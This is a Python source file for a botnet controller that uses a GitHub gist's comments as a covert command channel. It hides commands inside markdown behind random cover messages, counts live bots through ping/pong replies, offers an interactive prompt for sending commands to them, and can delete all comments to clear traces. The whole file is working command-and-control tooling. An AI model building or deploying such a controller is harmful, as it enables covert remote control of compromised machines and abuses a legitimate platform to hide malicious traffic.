#! /bin/python3
import argparse
import sys
import threading
import time
import requests
from dotenv import dotenv_values
from utils import create_markdown_comment, get_random_message, parse_markdown_comment

parser = argparse.ArgumentParser(
    prog='controller.py',
    description='Bot controller script, connect to given gist channel and send commands'
)

try:
    github_token = dotenv_values(".env")['GITHUB_TOKEN']
except KeyError:
    github_token = None

parser.add_argument('gistId', help="Github gist id")
parser.add_argument(
    '-t', '--token', help='Github personal access token, required if not specified in .env file', required=github_token is None)
parser.add_argument(
    '-b', '--bot-check-frequency', help='Set bot polling interval', type=int, default=20)
parser.add_argument('-d', '--delete', help="Delete all comments",
                    action='store_true')

args = parser.parse_args()

if(github_token is None):
    github_token = args.token

gist_id = args.gistId
gist_url = f'https://api.github.com/gists/{gist_id}'
comments_url = f'{gist_url}/comments'

headers = {"authorization": f'bearer {github_token}'}
gist_response = requests.get(gist_url, headers=headers)
gist = gist_response.json()
state = {"last_update": gist['updated_at'], "bot_count": 'checking...'}

try:
    print(f"Channel url: {gist['url']}")
except KeyError:
    print(f'Failed tof fetch gist: {gist_response}')
    exit()


def get_comments(latest_only=False):
    comments = requests.get(comments_url, headers=headers).json()
    if latest_only:
        comments = list(filter(
            lambda comment: comment['updated_at'] > state['last_update'], comments))
    return comments


def print_comments(latest_only=False, commands_only=False):
    comments = get_comments(latest_only=latest_only)

    comments = filter(lambda comment: not (
        'ping' in comment['body'] or 'pong' in comment['body']), comments)

    comment_cards = map(lambda comment: f"""
    {comment['created_at']}: {comment['user']['login']}[{comment['user']['id']}]> "{parse_markdown_comment(comment['body']) if commands_only else comment['body']}" """, comments)

    for card in comment_cards:
        print(card)


def post_comment(message, silent=False):
    response = requests.post(
        comments_url, json={"body": message}, headers=headers)
    state["last_update"] = response.json()['updated_at']
    if not silent:
        print(response)


def delete_comment(comment_id: str):
    return requests.delete(
        f'{comments_url}/{comment_id}', headers=headers)


def prompt(message="$ "):
    sys.stdout.write(message)
    sys.stdout.flush()
    return sys.stdin.readline().strip()


def check_bots():
    while True:
        post_comment(
            f'{get_random_message()}\n\n{create_markdown_comment("ping")}', silent=True)
        time.sleep(args.bot_check_frequency)
        comments = get_comments(latest_only=True)
        commands = map(lambda comment: parse_markdown_comment(
            comment['body']), comments)
        bot_count = len(
            list(filter(lambda command: command == 'pong', commands)))
        state['bot_count'] = bot_count


if args.delete:
    comments = get_comments()
    for comment in comments:
        print(f"deleting {comment['id']}")
        response = delete_comment(comment['id'])
        print(response)

bot_check_thread = threading.Thread(
    target=check_bots, daemon=True)
bot_check_thread.start()

while True:
    command = prompt(f"[bots: {state['bot_count']}] $ ")
    match command:
        case 'comments':
            print('> fetching comments')
            print_comments()
        case 'commands':
            print('> fetching commands')
            print_comments(commands_only=True)

        case 'latest':
            print('> fetching latest commands')
            print_comments(latest_only=True, commands_only=True)

        case 'post':
            comment = prompt("> Write comment: ")
            command = prompt("> Submit command: ")
            post_comment(f'{comment}\n\n{create_markdown_comment(command)}')
        case 'bots':
            print(f'> bot count: {state["bot_count"]}')
        case 'exit':
            break
        case other:
            print('> Unknown command: ' + command)
